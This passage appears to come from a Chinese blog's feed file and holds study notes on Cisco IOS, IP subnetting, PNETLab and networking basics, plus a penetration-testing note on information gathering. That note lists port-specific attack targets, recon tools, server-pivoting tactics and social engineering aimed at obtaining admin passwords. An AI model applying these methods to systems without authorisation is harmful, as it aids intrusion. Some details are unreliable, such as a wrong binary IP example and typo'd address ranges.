快捷键</h2><ul><li>Tab：填写命令或者关键字的剩下部分</li><li>Ctrl+R：重新显示一行</li><li>Ctrl+Z：退出配置模式并返回执行模式</li><li>Ctrl+C：放弃当前命令并退出配置模式</li><li>Ctrl+Shift+6：用于中断诸如 ping 或 traceroute 之类的 IOS 进程</li><li>向上箭头：上一条键入命令</li><li>向下箭头：下一条键入命令</li></ul><h2 id="1-10-常用配置"><a href="#1-10-常用配置" class="headerlink" title="1.10 常用配置"></a>1.10 常用配置</h2><ul><li>配置用户登录密码<ul><li>控制台口令：用于限制人员通过控制台连接访问设备</li><li>使能口令：用于限制人员访问特权执行模式</li><li>使能加密口令：经加密，，用于限制人员访问特权执行模式</li><li>VTY口令：用于限制人员通过 Telnet 访问设备</li></ul></li><li>管理配置文件<ul><li>将当前配置写入启动配置文件<ul><li>write</li><li>copy running-config startup-config</li></ul></li><li>删除启动配置 文件<ul><li>erase startup-config</li><li>delete flash:config.text</li></ul></li></ul></li><li>接口配置<ul><li>进入接口<ul><li>interface 接口类型 插槽&#x2F;接口编号</li></ul></li><li>为接口配置IP地址<ul><li>ip address ip地址 子网掩码</li></ul></li><li>激活接口<ul><li>no shutdown（默认是shutdown状态）</li></ul></li></ul></li><li>show 命令<ul><li>show version：查看当前操作系统版本</li><li>show running-config：查看运行配置</li><li>show startup-config：查看启动配置</li><li>show flash：查看FLASH</li><li>show cpu：查看cpu利用率</li><li>show memory：查看内存使用情况</li><li>show interface：查看端口</li></ul></li><li>验证配置<ul><li>ping</li><li>traceroute</li></ul></li></ul><h1 id="二：以太网技术线缆标准"><a href="#二：以太网技术线缆标准" class="headerlink" title="二：以太网技术线缆标准"></a>二：以太网技术线缆标准</h1><ul><li>T-568A：绿白-绿-橙白-蓝-蓝白-橙-棕白-棕</li><li>T-568B：橙白-橙-绿白-蓝-蓝白-绿-棕白-棕</li><li>标准网线：不同设备用于直通线，即两头都是568A或者都是568B</li><li>交叉网线：同等设备用交叉线即一头为568A，一头为568B</li><li>全反线（一般用于配置线缆）两端线序刚好相反</li></ul><h1 id="三：工程三招"><a href="#三：工程三招" class="headerlink" title="三：工程三招"></a>三：工程三招</h1><ul><li>no ip domain lookup：关闭域名解析（防止敲错命令查询）</li><li>line console 0<ul><li>logging synchronous：log当前显示信息同步</li><li>no exec-timeout：关闭会话超时，防止一段时间不操作自动退出</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 思科CCNA网络基础入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco IOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址及子网掩码划分</title>
      <link href="/blog/d1b25a9b.html/"/>
      <url>/blog/d1b25a9b.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：IP（internet-protocol）"><a href="#一：IP（internet-protocol）" class="headerlink" title="一：IP（internet protocol）"></a>一：IP（internet protocol）</h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><p>IP指网络互联协议，是TCP&#x2F;IP体系中的网络层协议。</p><p>设计IP的目的是提高网络的可扩展性：</p><ul><li>一是解决互联网问题，实现大规模、异构网络的互联互通；</li><li>二是分割顶层网络应用和底层网络技术之间的耦合关系，以利于双方独立发展；</li><li>根据端到端的设计原则，IP只为主机提供了一种无连接、不可靠的、尽力而为的数据包传输服务。</li></ul><p>例如：192.168.1.1，该IP采用的是点分十进制的表示方法。但在计算机的世界中采用的是点分二进制的方法，对应的地址表示：1111 1111.0000 0000.0000 0000.0000 0000。由此，通过运算我们可以得出IP地址一共有2<sup>32</sup>次方个，约<strong>42.9亿个</strong>。</p><h2 id="1-2-IP-地址分类"><a href="#1-2-IP-地址分类" class="headerlink" title="1.2 IP 地址分类"></a>1.2 IP 地址分类</h2><h3 id="（1）IP划分"><a href="#（1）IP划分" class="headerlink" title="（1）IP划分"></a>（1）IP划分</h3><ul><li>A类地址：1.0.0.1~126.255.255.254</li><li>B类地址：128.0.0.1~191.255.255.254</li><li>C类地址：192.0.0.1~223.225.225.254</li><li>D类地址：224.0.0.1~239.255.255.254（多播地址）</li><li>E类地址：240.0.0.1~255.255.255.254（科研预留）</li></ul><h3 id="（2）用途划分"><a href="#（2）用途划分" class="headerlink" title="（2）用途划分"></a>（2）用途划分</h3><ul><li>网络地址（network）：也可以称网络号，唯一指定了每个网络。同一个网络中的每台计算机都共享相同的网络地址，并用它作为自己的IP地址一部分。它定义了IP地址所属的网段。</li><li>结点地址（host）：也可以称为主机地址，是在一个网络中用来标识每台计算机的，它也是唯一的标识符。相对于网络而言，它是用来独立标志指定计算机的。</li></ul><h2 id="1-3-私有IP地址"><a href="#1-3-私有IP地址" class="headerlink" title="1.3 私有IP地址"></a>1.3 私有IP地址</h2><ul><li>A类地址中：10.0.0.0到10.255.255.255</li><li>B类地址中：172.16.0.0到172.31.255.255</li><li>C类地址中：192.168.0.0到192.168.255.255</li></ul><p>注意：私有IP地址一般用于公司内部，私有地址可以相同。</p><h2 id="1-4-特殊的IP地址"><a href="#1-4-特殊的IP地址" class="headerlink" title="1.4 特殊的IP地址"></a>1.4 特殊的IP地址</h2><ul><li>本地回环（loopback ）：127.0.0.1，通常使用ping命令来检测，网卡是否可用正常使用（测试地址）。</li><li>广播地址：255.255.255.255</li><li>IP地址 0.0.0.0：代表任何网络</li><li>向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网支持广播传输。如136.78.255.255就是B类地址中的一个广播地址，你将信息送到此地址，就是将信息送给网络号为136.78的所有主机。</li></ul><h2 id="1-5-IP-地址分配主机的数量"><a href="#1-5-IP-地址分配主机的数量" class="headerlink" title="1.5 IP 地址分配主机的数量"></a>1.5 IP 地址分配主机的数量</h2><p>根据子网掩码的位数，来计算IP地址的数量，即主机地址的个数。</p><ul><li>A类地址：2<sup>24</sup>个地址，约1677万个</li><li>B类地址：2<sup>16</sup>个地址，65534个</li><li>C类地址：2<sup>8</sup>个地址，254个</li></ul><h1 id="二：子网掩码"><a href="#二：子网掩码" class="headerlink" title="二：子网掩码"></a>二：子网掩码</h1><h2 id="2-1-常见掩码"><a href="#2-1-常见掩码" class="headerlink" title="2.1 常见掩码"></a>2.1 常见掩码</h2><ul><li>A类地址：1.0.0.1~126.255.255.254<ul><li>默认掩码：255.0.0.0 &#x3D;&#x3D;&#x2F;8</li></ul></li><li>B类地址：128.0.0.1~191.255.255.254<ul><li>默认掩码：255.255.0.0 &#x3D;&#x3D;&#x2F;16</li></ul></li><li>C类地址：192.0.0.1~223.225.225.254<ul><li>默认掩码：255.255.255.0 &#x3D;&#x3D;&#x2F;24</li></ul></li><li>采用点分二进制表达式：0表示主机位，1表示网络位</li></ul><h2 id="2-2-VLSM"><a href="#2-2-VLSM" class="headerlink" title="2.2 VLSM"></a>2.2 VLSM</h2><p>变长子网掩码（Variable length subnet masks）的出现是打破传统的以类（class）为标准的地址划分的方法，目的是缓解IP地址紧缺而产生的。</p><p>作用：节约IP地址空间。</p><p>注意事项：使用 VLSM 时，所采用的路由协议必须都能够支持它，这些路由协议包括RIPv2，OSPF，EIGPR 和 BGP。</p><h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>举例说明：某公司现有一C类网段 192.168.1.0&#x2F;24</p><p>目前有以下部门：销售部 59台、技术部 27台、业务部 121台、会计部 10台。</p><p>需求：将一个C类网段合理分配给如下几个部门，保证地址合理即可。</p><ul><li>4个网络<ul><li>192.168.1.0~63</li><li>192.168.1.64~127</li><li>192.168.1.128~191</li><li>192.168.1.192~255</li><li>当划分到业务部时，发现地址不够，所以子网划分时，优先考虑主机数最大的网段。</li></ul></li><li>2个网络<ul><li>192.168.1.01-126可容纳126台主机</li><li>192.168.1.128  129-254  可容纳126台主机</li><li>以此在网下划分即可；</li></ul></li></ul><p>当我们不断将有效位置1时，极限抵达192.168.1.0&#x2F;30，此时对应的子网掩码为：255.255.255.252，此时仅剩2个主机位，只能实现1对1的端到端通信。 </p><h2 id="2-3-CIDR"><a href="#2-3-CIDR" class="headerlink" title="2.3 CIDR"></a>2.3 CIDR</h2><p>CIDR（classless inter-Domain routing，无类域间路由选择），它消除了传统的A类、B类和C类地址，以及子网划分的概念，可以将原本划分的网络进行合并。使用一种无类别的域际路由选择算法，使它们合并成一条路由从而较少路由表中的路由条目减轻internet路由器的负担。</p>]]></content>
      
      
      <categories>
          
          <category> 思科CCNA网络基础入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PNETLab 模拟器</title>
      <link href="/blog/7c0df4a5.html/"/>
      <url>/blog/7c0df4a5.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：PNETLab-是什么？"><a href="#一：PNETLab-是什么？" class="headerlink" title="一：PNETLab 是什么？"></a>一：PNETLab 是什么？</h1><p>PNETLab（分组网络仿真器工具实验室）是一个允许您下载并与社区共享实验室的平台，它包括 PNETLab Box 和 PNETLab store。</p><ul><li>PNETLab Box<ul><li>它是一个虚拟机，安装在本地机器上，实验室将在上面运行。</li><li>模式<ul><li>线上模式</li><li>线下模式</li></ul></li></ul></li><li>PNETLab Store<ul><li>一个网络平台，提供了成百上千个免费的实验室，可以获取实验室和将其下载学习</li></ul></li></ul><h1 id="二：设计理念"><a href="#二：设计理念" class="headerlink" title="二：设计理念"></a>二：设计理念</h1><h2 id="2-1-主要特征"><a href="#2-1-主要特征" class="headerlink" title="2.1 主要特征"></a>2.1 主要特征</h2><ul><li>许多人可以登录一个PNETLab Box</li><li>许多人可以加入同一个实验室会话</li><li>按“角色”设置用户权限</li><li>为每个实验室设置权限：谁可以打开新会话，谁可以加入会话，谁可以编辑实验室</li><li>锁定实验室</li><li>管理监控实验室</li></ul><h1 id="三：使用教程"><a href="#三：使用教程" class="headerlink" title="三：使用教程"></a>三：使用教程</h1><h2 id="3-1-如何添加角色？"><a href="#3-1-如何添加角色？" class="headerlink" title="3.1 如何添加角色？"></a>3.1 如何添加角色？</h2><p>创建角色: 帐户 &gt; 角色管理 &gt; 单击“添加”按钮；</p><p>设置用户权限：</p><ul><li><strong>Delete Folder: 删除文件夹</strong>：用户可以删除其工作区上的文件夹</li><li><strong>Add New Folder: 添加新文件夹</strong>：用户可以在其工作区中添加新的文件夹</li><li><strong>Rename or Move Folder: 重命名或移动文件夹</strong>：用户可以更改名称或拖放来移动工作区上的文件夹</li><li><strong>Delete Lab: 删除实验室</strong>：用户可以删除工作区上的实验室</li><li><strong>Add New Lab 添加新的实验室</strong>：用户可以在他们的工作区中添加一个新的实验室</li><li><strong>Import Lab: 导入实验室</strong>：用户可以导入他们工作空间的实验室</li><li><strong>Export Lab: 出口实验室</strong>：用户可以导出实验室到他们的工作空间</li><li><strong>Move Lab 移动实验室</strong>：用户可以将Lab移动到他们的工作区</li><li><strong>Clone Lab 克隆实验室</strong>：用户可以在他们的工作空间上克隆实验室</li></ul><h2 id="3-2-如何添加账户？"><a href="#3-2-如何添加账户？" class="headerlink" title="3.2 如何添加账户？"></a>3.2 如何添加账户？</h2><p>要将帐户添加到您的框中，帐户 &gt; 用户管理 &gt; 单击“添加”按钮；</p><p><em>最大帐户数是您可以添加到此框中的帐户数。默认情况下，您可以添加最多10个帐户。</em></p><ol><li>填写要添加的用户的电子邮件</li><li>选择之前创建的角色</li><li>选择 Node。您应该选择每个组的节点，以便更容易地进行筛选</li><li>按钮添加用户。现在可以看到表中添加的所有用户</li><li>编辑后，点击**Apply **生效</li></ol><h2 id="3-3-如何设置实验室权限？"><a href="#3-3-如何设置实验室权限？" class="headerlink" title="3.3 如何设置实验室权限？"></a>3.3 如何设置实验室权限？</h2><p>PNETLab Box 允许您为每个实验设置权限。你可以设置谁可以开放实验室，谁可以加入实验室，谁可以编辑实验室。</p><ul><li><p>谁能打开这个实验室？</p></li><li><p>当用户打开一个实验室，这个实验室的一个新的会话将被创建并显示在运行实验室。</p><ul><li><strong>Admin Only: 仅管理员</strong></li><li><strong>Everyone: 各位</strong></li><li><strong>Admin and Special users: 管理员及特别用户</strong></li></ul></li><li><p>谁能加入这个实验室？</p></li><li><p>用户可以在“运行实验室”选项卡上看到所有运行实验室。用户只能加入他们有权加入的实验室。</p></li><li><p>谁能编辑这个实验室？</p></li><li><p>在加入实验室之后。只有有权编辑实验室的人才能编辑课程。否则他们可能会:</p><ul><li><strong>Start Node 启动节点</strong></li><li><strong>Stop Node 停止节点</strong></li><li><strong>Wipe Node 擦除节点</strong></li><li><strong>Console to Node 控制台到 Node</strong></li><li><strong>Using Workbook 使用工作簿</strong></li><li><strong>Timer 计时器</strong></li><li><strong>Change Active Config on Multi Config 在多个配置上更改活动配置</strong></li></ul></li></ul><h2 id="3-4-管理运行实验室"><a href="#3-4-管理运行实验室" class="headerlink" title="3.4 管理运行实验室"></a>3.4 管理运行实验室</h2><p>当用户打开任何实验室，一个实验室会话将被创建并显示在运行实验室。打开实验室的用户将成为实验室会话的主机。</p><p>我们可以看到有关会议主持人的信息，他们正在加入实验室。</p><ul><li>Destroy Lab：摧毁实验室</li><li>Join the Lab：加入实验室</li></ul><h2 id="3-5-管理-PNETLab-存储上的帐户"><a href="#3-5-管理-PNETLab-存储上的帐户" class="headerlink" title="3.5 管理 PNETLab 存储上的帐户"></a>3.5 管理 PNETLab 存储上的帐户</h2><p>您可以管理所有帐户的所有 PNETLab 盒上的商店。</p><h2 id="3-6-如何共享文件夹？"><a href="#3-6-如何共享文件夹？" class="headerlink" title="3.6 如何共享文件夹？"></a>3.6 如何共享文件夹？</h2><p>定义一个共享文件夹列表。</p><p>只有管理员有权编辑共享文件夹列表<strong>System &gt; System Setting 系统 &gt; 系统设定</strong></p><p>选择要共享的文件夹。编辑用户对共享文件夹的权限；</p><p>保存之后，所有用户都将看到共享文件夹并拥有访问该文件夹的权限。</p><h2 id="3-7-管理内存，CPU，硬盘"><a href="#3-7-管理内存，CPU，硬盘" class="headerlink" title="3.7 管理内存，CPU，硬盘"></a>3.7 管理内存，CPU，硬盘</h2><p>PNETLab 允许您管理每个节点上的 CPU、 RAM、 HDD、每个 Lab 会话和每个用户。您可以限制内存，CPU，硬盘为每个用户</p><h3 id="System-Status-系统状态"><a href="#System-Status-系统状态" class="headerlink" title="System Status 系统状态"></a><strong>System Status 系统状态</strong></h3><p>以通过单击来监视所有节点的信息查看系统状态</p><h3 id="查看用户占用资源"><a href="#查看用户占用资源" class="headerlink" title="查看用户占用资源"></a>查看用户占用资源</h3><p><strong>Accounts &gt; Roles Manager</strong></p><p>可以看到用户占用了多少% 的 RAM 和 CPU；</p><h3 id="实验室资源"><a href="#实验室资源" class="headerlink" title="实验室资源"></a>实验室资源</h3><p>管理每个实验室的资源，请转到 <strong>Running Labs</strong></p>]]></content>
      
      
      <categories>
          
          <category> 思科CCNA网络基础入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PNETLab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络基础</title>
      <link href="/blog/9ab2931e.html/"/>
      <url>/blog/9ab2931e.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：网络是什么？"><a href="#一：网络是什么？" class="headerlink" title="一：网络是什么？"></a>一：网络是什么？</h1><p>将地理位置不同的多台计算机，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。</p><h1 id="二：网络的类型"><a href="#二：网络的类型" class="headerlink" title="二：网络的类型"></a>二：网络的类型</h1><h2 id="2-1-局域网（LAN）"><a href="#2-1-局域网（LAN）" class="headerlink" title="2.1 局域网（LAN）"></a>2.1 局域网（LAN）</h2><p>LAN（local area network）：一组终端设备和由共同的组织管理的用户。</p><h2 id="2-2-广域网（WAN）"><a href="#2-2-广域网（WAN）" class="headerlink" title="2.2 广域网（WAN）"></a>2.2 广域网（WAN）</h2><p>WAN（wide area network）：连接分布于不同地理位置的 LAN。</p><h2 id="2-3-LAN-与-WAN-的关系"><a href="#2-3-LAN-与-WAN-的关系" class="headerlink" title="2.3 LAN 与 WAN 的关系"></a>2.3 LAN 与 WAN 的关系</h2><p>局域网与广域网的概念是相对的，弹性的，针对不同的场景，所指定的网络可能即是局域网、又是广域网。</p><h1 id="三：常见的网络设备"><a href="#三：常见的网络设备" class="headerlink" title="三：常见的网络设备"></a>三：常见的网络设备</h1><ul><li>交换机（switch）</li><li>路由器（router）</li></ul><h1 id="四：OSI-参考模型"><a href="#四：OSI-参考模型" class="headerlink" title="四：OSI 参考模型"></a>四：OSI 参考模型</h1><ul><li>20世纪70年代后期，ISO创建OSI参考模型，希望不同供应商的网络能够相互协同工作。</li><li>OSI：开放系统互联（open system interconnection）</li><li>ISO：国际化标准组织（International organization for standardization）</li></ul><h1 id="五：为什么要进行分层"><a href="#五：为什么要进行分层" class="headerlink" title="五：为什么要进行分层"></a>五：为什么要进行分层</h1><ul><li>分层的优点<ul><li>促进标准化工作，允许各个供应商进行开发；</li><li>各层间相互独立，把网络操作分成低复杂性单元</li><li>灵活性好，某一层变换不会影响到别层，设计者可专心设计和开发模块功能。</li></ul></li></ul><h1 id="六：OSI-amp-TCP-x2F-IP"><a href="#六：OSI-amp-TCP-x2F-IP" class="headerlink" title="六：OSI &amp; TCP&#x2F;IP"></a>六：OSI &amp; TCP&#x2F;IP</h1><h2 id="OSI-参考模型"><a href="#OSI-参考模型" class="headerlink" title="OSI 参考模型"></a>OSI 参考模型</h2><ul><li>物理层</li><li>链路层</li><li>网络层</li><li>传输层</li><li>会话层</li><li>表示层</li><li>应用层</li></ul><h2 id="TCP-x2F-IP-协议"><a href="#TCP-x2F-IP-协议" class="headerlink" title="TCP&#x2F;IP 协议"></a>TCP&#x2F;IP 协议</h2><ul><li>网络接口层</li><li>网络互联层</li><li>传输层</li><li>应用层</li></ul><h1 id="七：物理层"><a href="#七：物理层" class="headerlink" title="七：物理层"></a>七：物理层</h1><ul><li>物理层的主要作用是产生并检测电压发送和接收带有数据的电气信号。</li><li>物理层不是提供数据的纠错服务的，但是在物理层上能对数据的传输速度作一定的控制，并能监测数据的出错率。</li><li>在物理层传输电气信号的载体我们称之为位流或者比特流。</li></ul><h2 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h2><ul><li>双绞线（twisted pair）：又两根具有绝缘保护层的铜导线相互缠绕而成。<ul><li>屏蔽双绞线（STP）：shielded twisted pair</li><li>非屏蔽双绞线（UTP）：unshielde twisted pair</li><li>区别：物理结构上，屏蔽双绞线比非屏蔽双绞线多了全屏蔽层（和&#x2F;或）线对屏蔽层，通过屏蔽的方式，减少了衰减和噪音，而提供了更加干净的电子信号，和更长的电缆长度，与此同时带来的是更加昂贵的价格和重量，且不易安装。</li></ul></li><li>集线器<ul><li>又称Hub，中心的意思。主要功能是对接收到的信号进行再生整形和放大，以扩大网络的传输距离，同时把所有的节点集中在以它为中心的节点上。</li></ul></li><li>转换器<ul><li>converter，将一种信号转换成另一种信号的装置。</li><li>网络中常见的数模转换。</li></ul></li><li>中继器<ul><li>RP repeater，适用于完全相同的两个网络互联，主要用于对数据信号的重新发送或者转发，来扩大网络传输距离。</li><li>在局域网环境下用来延长网络距离，但其属于网络互联设备。在对线路上的信号具有放大再生的功能，用于扩展局域网网段长度（仅连接相同的局域网网段）。</li><li>常用于两个网络节点之间物理信号的双向转发工作。</li></ul></li></ul><h1 id="八：数据链路层"><a href="#八：数据链路层" class="headerlink" title="八：数据链路层"></a>八：数据链路层</h1><ul><li>数据链路层决定数据通讯的机制，差错检测</li><li>提供对网络层的服务</li><li>合成传输的帧数据</li></ul><h2 id="数据链路层设备"><a href="#数据链路层设备" class="headerlink" title="数据链路层设备"></a>数据链路层设备</h2><ul><li>交换机<ul><li>switch，一种用于电（光）信号转发的网络设备。</li></ul></li><li>网桥<ul><li>bridge，早期的两端口二层网络设备</li><li>网桥的两个端口分别有一条独立的交换信道，不是共享一条背板总线，可以隔离冲突域。</li></ul></li><li>网卡<ul><li>network interface controller，被设计用于允许计算机在计算机网络上进行通讯的计算机硬件。</li><li>拥有独一无二的MAC（media access control address，媒体存取控制位址）地址。</li><li>以太网地址（ethernet address）或者物理地址（physical address）</li></ul></li></ul><h1 id="九：MAC-地址"><a href="#九：MAC-地址" class="headerlink" title="九：MAC 地址"></a>九：MAC 地址</h1><p>Mac（media access control address），标识硬件可达网络的唯一地址符。</p><p>Mac 地址的结构：</p><ul><li>由48位二进制数组成，通常表示为12个16进制数</li><li>前24位是标准组织（IEEE）制定的，后24位是厂家自己制定的节点标识符</li><li>例如：00-1C-25-91-65-48<ul><li>00-1C-25：<ul><li>24比特，供应商标识</li><li>对于目的地址：<ul><li>0 物理地址（单播地址）</li><li>1 逻辑地址（组播地址）</li></ul></li></ul></li><li>91-65-48：<ul><li>供应商对网卡的唯一编号</li></ul></li></ul></li></ul><h1 id="十：网络层"><a href="#十：网络层" class="headerlink" title="十：网络层"></a>十：网络层</h1><ul><li>负责为网络设备提供逻辑地址</li><li>负责数据从源端发送到目的端</li><li>负责数据传输的寻径和转发</li></ul><h1 id="十一：应用层"><a href="#十一：应用层" class="headerlink" title="十一：应用层"></a>十一：应用层</h1><ul><li>应用层的作用主要是为应用软件提供接口，从而使得应用程序能够使用网络服务。</li><li>http，ftp，telnet，dns，smtp…</li></ul><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><ul><li>80：http</li><li>21：ftp</li><li>23：telnet</li><li>25：smtp</li><li>53：dns</li><li>69：tftp</li><li>161：snmp</li><li>rip：520</li></ul><h1 id="十二：传输层"><a href="#十二：传输层" class="headerlink" title="十二：传输层"></a>十二：传输层</h1><ul><li>传输层负责建立端到端的连接，负责数据在端到端之间的传输</li><li>传输层通过端口号区分上层服务</li></ul><h1 id="十三：TCP-与-UDP-的区别"><a href="#十三：TCP-与-UDP-的区别" class="headerlink" title="十三：TCP 与 UDP 的区别"></a>十三：TCP 与 UDP 的区别</h1><ul><li>传输控制协议（TCP，transmission control protocol）<ul><li>面向连接</li><li>可靠传输</li><li>流控及窗口机制</li><li>使用TCP的应用<ul><li>web浏览器</li><li>电子邮件</li><li>文件传输程序</li></ul></li></ul></li><li>用户数据报协议（UDP，user datagram protocol）<ul><li>无连接</li><li>不可靠传输</li><li>尽力而为的传输</li><li>使用 UDP 的应用<ul><li>域名系统（DNS，domain name system）</li><li>视频流</li><li>IP语音</li></ul></li></ul></li></ul><h1 id="十四：数据传输过程"><a href="#十四：数据传输过程" class="headerlink" title="十四：数据传输过程"></a>十四：数据传输过程</h1><p>首先，客户端应用程序产生数据，形成 payload 有效载荷。</p><p>传输层接受到应用层数据后，将其加封装成 segment（片段），成为其头部。</p><p>网络层接受到传输层的数据后，将其再次加封装成 packet（包），成为其头部。</p><p>网络接口层接收到网络层的数据后，将其再次加封装成为 frame（帧），成为其头部。</p><p>在数据进行网络传递过程中，会经过网络设备，如进过路由器时，路由器会将其解封装至网络层，再为其进行重新加封装 packet，转发数据，直至服务器接收。</p>]]></content>
      
      
      <categories>
          
          <category> 思科CCNA网络基础入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/blog/312e3d12.html/"/>
      <url>/blog/312e3d12.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：前言"><a href="#一：前言" class="headerlink" title="一：前言"></a>一：前言</h1><p>在渗透测试中，信息收集是其中最重要的一部分。我们收集到的目标信息越多，渗透的切入点也就越多，对目标的渗透的成功率也就越高。因此，渗透测试的本质就是信息收集。</p><h1 id="二：信息要素"><a href="#二：信息要素" class="headerlink" title="二：信息要素"></a>二：信息要素</h1><ul><li>目标域名相关信息：域名注册人、联系人、联系方式、邮箱、域名历史记录、子域名、旁站、C段等</li><li>目标服务器相关信息：操作系统、中间件、数据库、静态资源、端口、服务等</li><li>目标CMS系统（内容管理系统）、框架</li><li>目标网站后门、敏感目录与文件：如git源码泄露、upload上传目录等</li></ul><h1 id="三：网站页面信息收集"><a href="#三：网站页面信息收集" class="headerlink" title="三：网站页面信息收集"></a>三：网站页面信息收集</h1><p>在我们浏览目标网站时，往往可以发现一些比较重要的信息。从网站的URL观察，有些URL会暴露网站使用的脚本语言。其次关注网站是否有在线客服窗口。通常在网站底部可以收集到的信息有：URL信息、在线客服、技术支持、关于公司的联系方式（邮箱、电话号码、工作地点等）、备案号、营业执照、后台登录接口、友情链接、相关二维码等。</p><h1 id="四：域名信息收集"><a href="#四：域名信息收集" class="headerlink" title="四：域名信息收集"></a>四：域名信息收集</h1><p>首先，得到一个目标域名后，我们通常第一件要做的事情就是去获取域名的注册信息，即该域名的DNS服务器信息和注册的个人信息等。</p><h2 id="4-1-Whois-查询"><a href="#4-1-Whois-查询" class="headerlink" title="4.1 Whois 查询"></a>4.1 Whois 查询</h2><p>whois 是一个标准的互联网协议，可用于查询域名是否被注册，以及注册域名的详细信息（如域名所有人、域名注册商等）。通过 whois 查询得到注册人的姓名和邮箱信息对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的更多信息。通常的，对中小站点而言，域名所有人极大可能是管理员。可以根据查询出的信息进行反查，从而获取更多信息。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li><p><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家 (chinaz.com)</a></p></li><li><p>通过 kali 自带的 whois 查询工具</p></li></ul><h2 id="4-2-备案信息查询"><a href="#4-2-备案信息查询" class="headerlink" title="4.2 备案信息查询"></a>4.2 备案信息查询</h2><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如网站搭建在其他国家，则不需要进行备案。</p><h3 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h3><ul><li><a href="http://icp.chinaz.com/">ICP备案查询 - 站长工具 (chinaz.com)</a></li><li><a href="https://beian.tianyancha.com/">ICP备案查询_备案号查询_网站备案查询 - 天眼查 (tianyancha.com)</a></li></ul><h2 id="4-3-端口"><a href="#4-3-端口" class="headerlink" title="4.3 端口"></a>4.3 端口</h2><p>一个网站可能会开放多个不同的端口，而我们可以通过同一网站的不同端口进行测试，扫描开放端口的方法很多。</p><h3 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h3><ul><li><p><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson (coolaf.com)</a></p></li><li><p>端口扫描工具：Nmap</p></li></ul><h3 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h3><ul><li>21：FTP爆破</li><li>22：SSH弱口令&#x2F;后面</li><li>873：Rsync 未授权访问漏洞</li><li>3306：MySQL 弱口令</li><li>3389：Windows远程桌面 Rdp 暴力破解&#x2F;远程桌面漏洞</li><li>6379：Redis 未授权访问漏洞&#x2F;爆破弱密码</li></ul><h2 id="4-4-子域名"><a href="#4-4-子域名" class="headerlink" title="4.4 子域名"></a>4.4 子域名</h2><p>目标的子域名是一个重要的测试点，收集到的子域名越多，意味着入侵的切入点也越多，所以要尽可能的收集目标的子域名。</p><h3 id="收集方式"><a href="#收集方式" class="headerlink" title="收集方式"></a>收集方式</h3><ul><li><p><a href="http://z.zcjun.com/">在线子域名爆破-子成君提供 (zcjun.com)</a></p></li><li><p>子域名扫描工具：oneforall、layer子域名挖掘机、SubDomainsBrute</p></li></ul><h2 id="4-5-C段、旁注"><a href="#4-5-C段、旁注" class="headerlink" title="4.5 C段、旁注"></a>4.5 C段、旁注</h2><p>对目标主机无计可施时，可以尝试从C段或者旁注入手。</p><p>C段入侵是拿下同一C段下的服务器，也就是说是D段1-225中的一台服务器，然后直接从被端掉的服务器出发进行其他测试；</p><p>旁注是指从同台服务器的其他网站入手，提权，然后把服务器拿下，自然就也把目标网站拿下了。</p><p>两者的区别：C段，同网段不同服务器；旁注，同服务器不同网站。</p><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p><a href="https://www.webscan.cc/">同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan</a></p><h2 id="4-6-目录（敏感信息）"><a href="#4-6-目录（敏感信息）" class="headerlink" title="4.6 目录（敏感信息）"></a>4.6 目录（敏感信息）</h2><p>目录扫描也是一个渗透测试的重要点，如果能从目录中找到一些敏感信息，那么渗透过程会更进一步。例如：扫描出后台源码，数据库配置文件，SQL注入，服务器配置信息，robots.txt（告知爬虫程序什么文件是可以访问的）的敏感目录或者敏感信息。</p><h3 id="工具使用-1"><a href="#工具使用-1" class="headerlink" title="工具使用"></a>工具使用</h3><ul><li>DirBuster</li></ul><h1 id="五：社会工程学"><a href="#五：社会工程学" class="headerlink" title="五：社会工程学"></a>五：社会工程学</h1><p>信息收集的最高境界大概就是社会工程学了，社会工程学（Social Engineering）是一种通过人际交流的方式获取信息的非技术渗透手段。利用社会工程学，攻击者可以从一名员工的口中挖掘出本应该是秘密的信息。</p><p>社会工程学协助渗透测试的例子数不胜数，渗透某个网站遇难时，给网站的呼叫人员打电话，往往能解决很多问题。此外，许多服务器的登录密码与该服务器的管理员有关，密码总是有个人痕迹，因此利用社会工程学获取管理员信息后，进一步对服务器进行渗透测试。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dirbuster 使用教程</title>
